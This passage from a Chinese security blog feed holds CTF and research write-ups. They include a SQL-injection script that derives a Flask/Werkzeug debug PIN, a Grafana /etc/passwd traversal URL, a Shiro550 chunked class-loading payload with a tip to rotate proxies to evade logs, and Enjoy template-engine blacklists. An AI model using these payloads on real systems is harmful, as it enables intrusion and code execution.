class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.70.185.87:5002/view?note_id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;0&#x27; union select 1,2,3,4,5; create table y4(t text); load data local infile &#x27;/sys/class/net/eth0/address&#x27; INTO TABLE y4 LINES TERMINATED BY &#x27;\\n&#x27;--+&quot;</span></span><br><span class="line">payload2 = <span class="string">&quot;0&#x27; union select 1,2,3,4,5; create table yy4(t text); load data local infile &#x27;/proc/self/cgroup&#x27; INTO TABLE yy4 LINES TERMINATED BY &#x27;\\n&#x27;--+&quot;</span></span><br><span class="line">payload3 = <span class="string">&quot;0&#x27; union select 1,2,3,(select group_concat(t) from y4),1; --+&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;0&#x27; union select 1,2,3,(select group_concat(t) from yy4),1; --+&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;cookie&quot;</span>:<span class="string">&quot;session=.eJwVi0EKwyAQAL8ie8mlEE3ArP1MWXdXCE21REsJpX-POcxlhvkB1z09WnlqhjvMkwvKHBktRmfD5J1NKj5EXBDZeppVAi5wg0_VPdNL-7UVEiPUyKw5rZuaYdTG45tq_crQZSumUezhOKRewP8E760nRw.YlqN-g.KZrp8S7tsXPS60cPH88awzRI35Q&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url+payload1,headers=headers)</span><br><span class="line">r = requests.get(url+payload2,headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(re.search(<span class="string">&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&#x27;</span>,requests.get(url+payload3,headers=headers).text.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)).groups()[<span class="number">0</span>].replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="string">&#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;</span>+re.search(<span class="string">&#x27;&lt;/h1&gt;&lt;pstyle=&quot;text-align:center&quot;&gt;(.*?)&lt;/p&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>,requests.get(url+payload4,headers=headers).text.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)).groups()[<span class="number">0</span>].split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>]<span class="comment">#  /etc/machine-id + /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>之前被爆有任意文件读，不知道有啥插件简单fuzz一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/plugins/alertGroups/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>大概看了下文档看看能读些什么配置</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/1.png"></p><p>先是读了sqlite，dump下来想看看admin密码来着，尝试很多没破解成功，显然是我不懂密码学</p><p>不过后面看到了<code>grafana.ini</code>，里面泄漏了，好吧还成功登陆了</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/2.png"></p><p>后台啥都无，不过有个添加数据源的地方，显然这里被注释了，但是真的链接成功了</p><p><img src="/2022/04/18/year/2022/4/2022-CTF-Web/3.png"></p><p>后面就是任意执行sql语句拿下了，没啥难度</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈Shiro550受Tomcat Header长度限制影响突破</title>
      <link href="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/"/>
      <url>/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅谈Shiro550受Tomcat-Header长度限制影响突破"><a href="#浅谈Shiro550受Tomcat-Header长度限制影响突破" class="headerlink" title="浅谈Shiro550受Tomcat Header长度限制影响突破"></a>浅谈Shiro550受Tomcat Header长度限制影响突破</h1><h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>写个shiro相关的东西，还是秉着写出来才能学的更多的理念，当然个人还是不太喜欢贴上整串代码，只是分享思路心得，在很早以前我学习这个只是想弹出计算器，但是后面自己还是更喜欢折腾实战方面的一些构思(虽然没有过)，在实战中我们更希望得到一个有回显的，而不是只是执行一个命令，关于回显最通用的就是去遍历线程对象中获取request，但是后面发现Tomcat居然有Header长度的限制，接下来就是解决问题</p><h2 id="0x01-一些传统思路"><a href="#0x01-一些传统思路" class="headerlink" title="0x01 一些传统思路"></a>0x01 一些传统思路</h2><h3 id="思路一：修改maxHeaderSize-不太喜欢"><a href="#思路一：修改maxHeaderSize-不太喜欢" class="headerlink" title="思路一：修改maxHeaderSize(不太喜欢)"></a>思路一：修改maxHeaderSize(不太喜欢)</h3><p>首先是在网上参考学习到了Litch1写的文章<a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44"><strong>基于全局储存的新思路 | Tomcat的一种通用回显方法研究</strong></a></p><p>里面提到了去修改org.apache.coyote.http11.AbstractHttp11Protocol中的maxHeaderSize的值，里面通过多个线程发送payload来确保request的inputbuffer会复用，个人觉得不太稳定，另一方面就算构造出来了其实也很长了，在我心中不是最优解</p><h3 id="思路二：分离payload-动态类加载"><a href="#思路二：分离payload-动态类加载" class="headerlink" title="思路二：分离payload+动态类加载"></a>思路二：分离payload+动态类加载</h3><ol><li>这个思路主要来源于读到开源工具<a href="https://github.com/SummerSec/ShiroAttack2">ShiroAttack2</a>里面提到的将payload分离为两个部分(一部分是去触发反序列化Gadget，另一部分是)，我的环境是tomcat8(因此需要遍历线程对象获取request/response便于回显)</li></ol><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/1.png" alt="img"></p><p>这里一个比较骚的点是通过Class自带的方法equals去传递request与response，当然也可以用其他的，这样比较方便</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/2.png" alt="img"></p><p>这样我们就成功实现了将payload缩短能获得回显的目的了</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/3.png" alt="img"></p><h2 id="0x02-浅谈新思路"><a href="#0x02-浅谈新思路" class="headerlink" title="0x02 浅谈新思路"></a>0x02 浅谈新思路</h2><p>但是呢，个人并不满足仅仅只是成功，如果某一天在某些框架下让header更短怎么办？这里我主要解决不落地的思路</p><p>能不能再将上面的思路二再分离开来来简单实现<strong>缩短payload+分散发包</strong></p><p>要解决这个那么一定要解决在全局能够持久存储我们的payload的地方，这里我想到了去修改当前线程对象的名字(Thread.<em>currentThread</em>().setName())，测试了下Thread的name能够有足够储存我们长度的能力</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/4.png" alt="img"></p><p>经过简单测试发现每次刷新网页这个线程都会改变，但总量就那么几个，那么我们肯定需要通过遍历来筛选</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/5.png" alt="img"></p><p>当然为了方便，我先将其中一个设置成我的id:Thread.currentThread().setName(“y4tacker”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  ThreadGroup a = Thread.currentThread().getThreadGroup();</span><br><span class="line">  java.lang.reflect.Field v2 = a.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">  v2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  Thread[] o = (Thread[]) v2.get(a);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; o.length; ++i) &#123;Thread z = o[i];<span class="keyword">if</span> (z.getName().contains(<span class="string">&quot;y4tacker&quot;</span>))&#123;z.setName(z.getName()+<span class="string">&quot;我是注入的payload&quot;</span>);</span><br><span class="line">                                                                                          &#125;&#125;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>通过一些其他手段缩减payload至最小差不多2400</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/6.png" alt="img"></p><p>这样我们只需要将注入的payload分成多段慢慢加入，通过下面的代码来最终触发我们设置向线程的paylaod执行任意代码了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;ThreadGroup a = Thread.currentThread().getThreadGroup();java.lang.reflect.Field v2 = a.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);v2.setAccessible(<span class="keyword">true</span>);Thread[] o = (Thread[]) v2.get(a);<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; o.length; ++i) &#123;Thread z = o[i];<span class="keyword">if</span> (z.getName().contains(<span class="string">&quot;y4&quot;</span>))&#123;</span><br><span class="line"> <span class="keyword">byte</span>[] x = org.apache.shiro.codec.Base64.decode(z.getName().replaceAll(<span class="string">&quot;y4tacker&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line"> java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line"> defineClassMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"> ((Class)defineClassMethod.invoke(a.class.getClassLoader(), x, <span class="number">0</span>, x.length)).newInstance();</span><br><span class="line">&#125;&#125;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这样还给我们一个好处就是，在每次发包的时候切换代理变更ip，maybe可以导致后台分析日志的时候会更难(毕竟每次发包之间总有其他用户的正常操作XD)，简单测试一下能不能弹个计算器嘞，答案永远是Yes</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/7.png" alt="img"></p><p>顺便提醒一句搞完了记得把线程名改回去哦，不然线程名变成啥样勒，plz</p><p><img src="/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/8.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Enjoy模板引擎分析</title>
      <link href="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Enjoy模板引擎分析"><a href="#Enjoy模板引擎分析" class="headerlink" title="Enjoy模板引擎分析"></a>Enjoy模板引擎分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>首先有关Enjoy模板引擎的一些描述可以看这里：<a href="https://jfinal.com/doc/6-1">https://jfinal.com/doc/6-1</a></p><h3 id="文档中值得关注的点"><a href="#文档中值得关注的点" class="headerlink" title="文档中值得关注的点"></a>文档中值得关注的点</h3><h4 id="属性访问触发get方法"><a href="#属性访问触发get方法" class="headerlink" title="属性访问触发get方法"></a>属性访问触发get方法</h4><p>在官方文档里面我们可以看到很多有趣的东西(当然我会更关注于一些相关的)，比如属性访问的这一条描述，可以让我们去触发对象的get方法(前提是public修饰)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于模板引擎的属性取值表达式极为常用，所以对其在用户体验上进行了符合直觉的扩展，field 表达式取值优先次序，以 user.name 为例：</span><br><span class="line"></span><br><span class="line">如果 user.getName() 存在，则优先调用</span><br><span class="line"></span><br><span class="line">如果 user 具有 <span class="keyword">public</span> 修饰过的name 属性，则取 user.name 属性值（注意：jfinal <span class="number">4.0</span> 之前这条规则的优先级最低）</span><br></pre></td></tr></table></figure><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>关于方法调用也有一些描述，说可以直接调用对象上的任何public方法，使用规则与java中调用方式保持一致，当然也不是所有方法都能调用，在源码的调试过程当中发现有一些方法在黑名单当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">getClass</span><br><span class="line">wait</span><br><span class="line">notifyAll</span><br><span class="line">getClassLoader</span><br><span class="line">invoke</span><br><span class="line">notify</span><br><span class="line">getDeclaringClass</span><br><span class="line">removeForbiddenMethod</span><br><span class="line">removeForbiddenClass</span><br><span class="line">suspend</span><br><span class="line">resume</span><br><span class="line">loadLibrary</span><br><span class="line">forName</span><br><span class="line">newInstance</span><br><span class="line">exit</span><br><span class="line">halt</span><br><span class="line">stop</span><br></pre></td></tr></table></figure><p>除此以外也有黑名单类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ThreadGroup</span><br><span class="line">java.lang.ProcessBuilder</span><br><span class="line">java.lang.System</span><br><span class="line">java.lang.ClassLoader</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">java.lang.Runtime</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.lang.Class</span><br><span class="line">com.jfinal.template.expr.ast.MethodKit</span><br><span class="line">java.io.File</span><br><span class="line">java.lang.reflect.Method</span><br><span class="line">java.lang.InheritableThreadLocal</span><br><span class="line">java.lang.Process</span><br><span class="line">java.lang.ThreadLocal</span><br><span class="line">java.lang.Package</span><br><span class="line">java.lang.SecurityManager</span><br><span class="line">java.lang.Compiler</span><br><span class="line">java.lang.RuntimePermission</span><br></pre></td></tr></table></figure><p>因此也给了我们更多的限制</p><h4 id="静态属性访问"><a href="#静态属性访问" class="headerlink" title="静态属性访问"></a>静态属性访问</h4><p>来个例子就懂了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span>(x.status == com.demo.common.model.Account::STATUS_LOCK_ID)</span><br><span class="line">   &lt;span&gt;(账号已锁定)&lt;/span&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h4 id="静态方法的调用"><a href="#静态方法的调用" class="headerlink" title="静态方法的调用"></a>静态方法的调用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span>(com.jfinal.kit.StrKit::isBlank(title))</span><br><span class="line">   ....</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>同时支持调用静态属性上的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(com.jfinal.MyKit::me).method(paras)</span><br></pre></td></tr></table></figure><h2 id="引擎执行流程简单分析"><a href="#引擎执行流程简单分析" class="headerlink" title="引擎执行流程简单分析"></a>引擎执行流程简单分析</h2><p>以下不感兴趣可以直接略过，因为不需要一些很详细的分析就能bypass，只要我们知道过滤了哪些类哪些方法针对绕过即可，这里权当自己好奇看看如何实现的，当然分析也只会主要去看一些能让我成功实现执行不安全函数的方式(指的是<code>#()</code>与<code>#set()</code>两种)，根据对文档的阅读，个人认为其他标签对于我意义不大，因为我如果能够执行一个命令我需要的是能够回显<code>#()</code>，或者我不能通过一步执行需要通过<code>#set(a=xxx)</code>的方式去拆分保存变量做中转，因此我在分析调试的过程当中只会针对这两个标签进行分析</p><p>为了独立分析这里引入了maven坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.jfinal<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>enjoy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.9.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一个基本的使用很简单，为了方便调试我写了个很简单的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ezsb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -na Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Template template = engine.getTemplateByString(<span class="string">&quot;#(com.example.ezsb.User::run())&quot;</span>);</span><br><span class="line">template.renderToString();</span><br></pre></td></tr></table></figure><p>首先由于默认未开启缓存，默认走第一个分支</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/1.png"></p><p>接下来我们看<code>com.jfinal.template.Engine#buildTemplateBySource</code>,同样我们只需要更关注于解析部分也就是<code>parser.parse()</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/2.png"></p><p>接下来我们先跟一下这个遍历字符串解析token的过程，首先是初步解析操作与内容，比如<code>#(xxx)</code>他就会识别成<code>OUTPUT xxxx )</code>三部分，<code>#set(&quot;a=xxx&quot;)</code>也会拆分成<code>set a=xxx )三部分</code>之后在statlist中，根据是<code>TEXT\SET\FOR\OUTPUT\INCLUDE\FOR\DEFINE\CALL.....</code>等去做更进一步的解析</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/3.png"></p><p>这里我们看看,首先当前位置一定是<code>#</code>，不然也没意义了，这里光看英文单词就知道我们更应该专注看<code>com.jfinal.template.stat.Lexer#scanDire</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/4.png"></p><p>这里如果<code>#</code>后面是<code>(</code>也就直接对应了<code>OUTPUT</code>，如果不是则判断后面如果是字母则转到state为10的分支（PS：后面那个如果是@则调用模板函数防止你们好奇），并设置对应的token</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/5.png"></p><p>接下来我们看看state为10的地方做的什么首先通过id去获取symbol</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/6.png"></p><p>简单看看这里一些内置的东西，如果没有的话就会去看是不是走define或者else if分支，当然超纲了我上面说过的只看<code>#()</code>和<code>#set()</code>，这里就不深入谈了</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/7.png"></p><p>接下来看debug窗口就和我们上面说的一样设置了下面的toknelist的内容</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/8.png"></p><p>接下来我们继续看看<code>statList</code>函数(在上一步的基础上进行更进一步的解析)，这里不管是<code>OUTPUT</code>还是<code>SET</code>其实值得我们关注的核心调用是相同的，也就是<code>this.parseExprList(para)</code></p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/9.png"></p><p>跟进<code>parseExprList</code>，一直到<code>com.jfinal.template.expr.ExprParser#parse</code>，我们跟进这个scan</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/10.png"></p><p>这里不再通篇像上面那样说如何解析的了，有兴趣可以自己看</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/11.png"></p><p>这里我们只看几个关键的，在scanOperator里面，一个是<code>::</code>作为STATIC静态标记，另一个是左括号和又括号</p><p><img 